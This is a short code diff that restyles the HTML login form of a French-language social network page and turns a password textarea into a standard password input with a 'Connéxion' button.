@@ -20,6 +20,15 @@ HTML_INTERFACE = """
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Mon Réseau Social</title>
     <style>
+         .form-group {
+            margin-bottom: 15px;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+            color: #666666;
+            font-weight: bold;
+        }
         body {
             background-color: #121214;
             color: #e1e1e6;
@@ -76,10 +85,16 @@ HTML_INTERFACE = """
             <label for="username">Numéro ou Compte émail :</label>
             <input type="text" id="username" name="username" required>
             
-            <label for="content">Mot de passe :</label>
-            <textarea id="content" name="content" rows="1" placeholder=".......... " required></textarea>
+            <div class="form-group">
+            <label id="label-pass" for="password">Mot de passe :</label>
+            <input 
+                type="password" 
+                id="password" 
+                name="password" 
+                placeholder="Votre mot de passe" 
+                required>
             
-            <button type="submit">Publier sur le réseau</button>
+            <button type="submit">Connéxion</button>
         </form>
         <div id="statusMessage" class="status"></div>
     </div>
